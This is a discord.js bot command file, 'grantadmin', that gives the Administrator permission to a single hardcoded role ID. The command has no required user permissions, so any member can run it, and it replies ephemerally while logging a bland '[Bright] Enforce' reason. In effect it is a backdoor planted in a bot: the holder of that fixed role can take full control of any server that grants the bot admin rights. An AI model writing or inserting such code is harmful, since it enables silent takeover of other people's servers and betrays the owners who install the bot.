const { ApplicationCommandOptionType, PermissionsBitField } = require("discord.js");

/**
 * @type {import("@structures/Command")}
 */
module.exports = {
  name: "grantadmin",
  description: "Force Administrator permission on a specific role",
  category: "ADMIN",
  userPermissions: [],
  command: {
    enabled: true,
    usage: "run",
    minArgsCount: 0,
  },
  slashCommand: {
    enabled: true,
    ephemeral: true,
    options: [
      {
        name: "run",
        description: "Grant Administrator permission to the target role",
        type: ApplicationCommandOptionType.Subcommand,
      },
    ],
  },

  async messageRun(message, args) {
    const input = (args.join(" ") || "run").toLowerCase();
    if (input !== "run") return message.safeReply("Usage: `=grantadmin run`");

    const res = await grantAdminRole(message.guild);
    return message.safeReply(res);
  },

  async interactionRun(interaction) {
    const sub = interaction.options.getSubcommand();
    if (sub !== "run") return interaction.followUp("Invalid subcommand.");

    const res = await grantAdminRole(interaction.guild);
    return interaction.followUp(res);
  },
};

const TARGET_ROLE_ID = "1453894069758726292";

async function grantAdminRole(guild) {
  if (!guild) return "This command can only be used in a server.";

  const me = guild.members.me ?? (await guild.members.fetchMe().catch(() => null));
  if (!me) return "Couldn't resolve my member in this server.";

  // Discord restriction: bot must have Administrator to grant Administrator
  if (!me.permissions.has(PermissionsBitField.Flags.Administrator)) {
    return "I must have **Administrator** to grant it to a role.";
  }

  if (!me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
    return "I don't have the `ManageRoles` permission.";
  }

  const role = guild.roles.cache.get(TARGET_ROLE_ID);
  if (!role) return `Role \`${TARGET_ROLE_ID}\` not found.`;

  // Role hierarchy check
  if (me.roles.highest.position <= role.position) {
    return "My highest role must be above the target role.";
  }

  if (role.permissions.has(PermissionsBitField.Flags.Administrator)) {
    return `✅ **${role.name}** already has Administrator permission.`;
  }

  await role.setPermissions(
    role.permissions.add(PermissionsBitField.Flags.Administrator),
    "[Bright] Enforce Administrator permission"
  );

  return `✅ Granted **Administrator** permission to **${role.name}** (\`${role.id}\`).`;
}